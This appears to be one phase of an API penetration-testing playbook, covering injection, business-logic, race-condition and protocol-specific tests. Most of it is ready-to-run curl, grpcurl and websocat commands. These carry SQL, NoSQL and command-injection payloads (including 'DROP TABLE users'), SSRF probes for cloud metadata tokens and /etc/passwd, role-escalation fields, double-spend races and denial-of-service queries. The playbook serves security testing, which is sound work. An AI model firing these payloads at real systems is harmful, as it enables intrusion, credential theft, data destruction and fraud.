## Phase 3: Injection & Logic

### Gate: injection tested on all input parameters, business logic flaws assessed, race conditions tested where applicable

**Prioritization (limited time? hit these in order):**
1. **Injection on auth endpoints** — SQLi/NoSQLi on login, registration, password reset (highest impact: auth bypass)
2. **Mass assignment on user creation/update** — role escalation via extra fields (quick win, high impact)
3. **Business logic on financial/state-changing operations** — double-spend, negative values, step skipping
4. **SSRF on URL-accepting parameters** — fetch, webhook, import endpoints (cloud metadata = Critical)
5. **Race conditions on limited resources** — only if financial/inventory operations exist
6. **Data exposure on list endpoints** — pagination bypass, over-fetching (usually Medium)

**Techniques:**

1. **Mass Assignment:**
   ```bash
   # Add unexpected fields to creation/update requests
   curl -sk -X POST "$BASE_URL/api/users" -H "Content-Type: application/json" \
     -d '{"name":"test","email":"test@test.com","role":"admin","is_verified":true,"balance":99999}'
   # Check which fields were accepted
   ```

2. **Injection:**
   ```bash
   # SQL injection
   curl -sk "$BASE_URL/api/users?id=1' OR '1'='1"
   curl -sk "$BASE_URL/api/users?sort=name;DROP TABLE users--"

   # NoSQL injection (MongoDB)
   curl -sk -X POST "$BASE_URL/api/login" -H "Content-Type: application/json" \
     -d '{"username":{"$gt":""},"password":{"$gt":""}}'

   # Command injection (in processing endpoints)
   curl -sk -X POST "$BASE_URL/api/convert" -d '{"filename":"test;id;.pdf"}'

   # SSRF (in URL parameters)
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
   # AWS IMDSv2
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
   # GCP metadata
   curl -sk "$BASE_URL/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
   # Azure metadata
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
   # Internal network scan
   curl -sk "$BASE_URL/api/fetch?url=http://127.0.0.1:8080/actuator/env"
   # DNS rebinding / protocol smuggling
   curl -sk "$BASE_URL/api/fetch?url=file:///etc/passwd"
   curl -sk "$BASE_URL/api/fetch?url=gopher://127.0.0.1:6379/_INFO"
   ```

3. **GraphQL-Specific:**
   ```bash
   # Alias-based batching (amplification)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"mutation { a:createUser(input:{name:\"t1\"}) { id } b:createUser(input:{name:\"t2\"}) { id } }"}'

   # Nested query DoS (depth attack)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}'

   # Field suggestion exploitation
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'
   ```

4. **Business Logic:**
   - Negative values in financial operations
   - Step skipping in multi-step workflows
   - Parallel requests for race conditions (double-spend)
   - Coupon/promo code reuse
   - Quantity manipulation (0, -1, MAX_INT)
   - State machine violations (cancel after ship, refund after refund)

5. **Race Conditions:**
   ```bash
   # Parallel requests for double-spend
   seq 1 10 | xargs -P10 -I{} curl -sk -X POST "$BASE_URL/api/transfer" \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"to":"attacker","amount":1000}'
   ```

6. **Data Exposure:**
   - Excessive data in responses (PII, internal IDs, debug info)
   - Different response sizes for valid vs invalid resources (enumeration)
   - Error messages leaking implementation details
   - Pagination bypass (requesting page_size=99999)

7. **API Versioning Exploitation:**
   ```bash
   # Discover available versions
   for v in v0 v1 v2 v3 v4 beta internal legacy; do
     code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/api/$v/users")
     [ "$code" != "404" ] && echo "  /api/$v/ -> $code"
   done

   # Compare auth enforcement across versions
   # Older versions often lack auth checks added later
   curl -sk "$BASE_URL/api/v1/admin/users"  # 401
   curl -sk "$BASE_URL/api/v0/admin/users"  # 200? Auth bypass via version downgrade

   # Check for deprecated endpoints still accessible
   # If OpenAPI spec shows removed endpoints, test them on older version prefixes
   ```
   **What to look for:** Auth bypass on older versions, removed-but-accessible admin endpoints, different validation rules (v1 validates input, v0 doesn't).

8. **WebSocket / SSE / Streaming:**
   ```bash
   # WebSocket discovery
   # Check for Upgrade: websocket in responses, or /ws /socket /realtime paths
   # Common frameworks: Socket.IO (/socket.io/?EIO=4&transport=polling), SignalR (/hub)

   # WebSocket auth bypass
   # Many WS endpoints check auth only on HTTP upgrade, not on subsequent messages
   websocat ws://target.com/ws -H "Authorization: Bearer $TOKEN"
   # After connection: try sending messages without re-authenticating

   # WS message injection (if no per-message auth)
   echo '{"action":"admin.listUsers"}' | websocat ws://target.com/ws

   # SSE subscription abuse
   curl -sk -N -H "Authorization: Bearer $USER_TOKEN" "$BASE_URL/api/events/stream"
   # Check: can you subscribe to other users' event streams?
   # Check: does the stream leak data from other tenants?

   # Streaming gRPC
   grpcurl -plaintext -d '{"user_id":"OTHER_USER"}' $HOST:$PORT service/StreamEvents
   # Server-streaming: can you receive other users' events?
   # Client-streaming: can you inject messages into other sessions?
   ```
   **Key patterns:** Auth checked on connect but not per-message, subscription to other users' channels, event replay (resend old message IDs), no rate limiting on WS messages.

9. **gRPC-Specific:**
   ```bash
   # Message manipulation
   grpcurl -plaintext -d '{"user_id": "OTHER_USER"}' $HOST:$PORT service/GetProfile
   # Reflection-based enumeration
   grpcurl -plaintext $HOST:$PORT list
   # Large message DoS
   grpcurl -plaintext -d '{"data": "'$(python3 -c "print('A'*1000000)")'" }' $HOST:$PORT service/Process
   ```

**Reference:** `references/graphql-testing.md`, `references/grpc-testing.md`
